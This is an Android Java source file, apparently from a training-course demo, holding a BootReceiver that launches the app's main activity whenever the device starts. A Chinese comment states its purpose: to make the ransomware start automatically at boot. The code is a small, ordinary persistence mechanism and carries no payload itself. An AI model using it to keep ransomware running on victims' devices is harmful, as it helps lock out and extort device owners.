package com.itheima.leisuo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * Author: 王俊超
 * Date: 2015-10-10
 * Time: 10:47
 * Declaration: All Rights Reserved !!!
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
//        System.out.println("开机成功");
//        Toast.makeText(context, "开机成功", Toast.LENGTH_SHORT).show();
        // 启动Activity，实现开机自动启动勒索软件
        Intent it = new Intent(context, MainActivity.class);
        it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(it);

    }
}
